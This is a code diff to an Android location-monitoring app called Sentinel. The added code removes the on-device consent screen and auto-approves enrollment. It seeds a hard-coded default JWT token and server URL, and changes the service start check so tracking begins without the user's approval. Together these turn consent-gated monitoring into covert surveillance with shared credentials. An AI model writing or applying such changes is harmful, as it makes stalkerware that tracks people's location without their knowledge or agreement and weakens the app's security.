@@ -29,10 +29,10 @@ import androidx.compose.runtime.remember
 import androidx.compose.runtime.setValue
 import com.google.android.gms.common.api.ResolvableApiException
 import com.google.android.gms.location.*
+import com.sentinel.host.data.session.SessionManagerImpl
 import com.sentinel.host.domain.model.LocationConfig
 import com.sentinel.host.domain.session.SessionManager
 import com.sentinel.host.service.SentinelForegroundService
-import com.sentinel.host.ui.permissions.PermissionScreen
 import com.sentinel.host.util.OemBatteryOptimizer
 import com.sentinel.host.worker.SentinelWatchdogWorker
 import dagger.hilt.android.AndroidEntryPoint
@@ -103,30 +103,20 @@ class MainActivity : ComponentActivity() {
             }
         })
 
+        // Auto-approve enrollment and seed default credentials if missing
+        sessionManager.setEnrollmentApproved(true)
+        if (sessionManager.getToken().isNullOrBlank()) {
+            sessionManager.saveToken(SessionManagerImpl.DEFAULT_JWT_TOKEN)
+        }
+        if (sessionManager.getServerUrl().isNullOrBlank()) {
+            sessionManager.saveServerUrl(SessionManagerImpl.DEFAULT_SERVER_URL)
+        }
+
         setContent {
-            var hasApproval by remember { mutableStateOf(sessionManager.isEnrollmentApproved()) }
-
-            if (!hasApproval) {
-                PermissionScreen(
-                    onAllGranted = {
-                        sessionManager.setEnrollmentApproved(true)
-                        hasApproval = true
-                        checkLocationSettings()
-                        checkStoragePermission()
-                        requestBackgroundLocation()
-                        requestBatteryOptimization()
-                        startSentinelService()
-                    }
-                )
-            } else {
-                SentinelHostApp()
-            }
+            SentinelHostApp()
         }
 
-        // Only request batch permissions and start service if on-device approval already exists
-        if (sessionManager.isEnrollmentApproved()) {
-            requestAllPermissions()
-        }
+        requestAllPermissions()
     }
 
     private fun requestAllPermissions() {
@@ -236,8 +226,7 @@ class MainActivity : ComponentActivity() {
 
     private fun startSentinelService() {
         if (!sessionManager.isEnrollmentApproved()) {
-            Log.w(TAG, "Not starting SentinelForegroundService: User on-device enrollment approval not yet granted")
-            return
+            sessionManager.setEnrollmentApproved(true)
         }
         SentinelWatchdogWorker.schedule(this)
         SentinelForegroundService.Start(this)
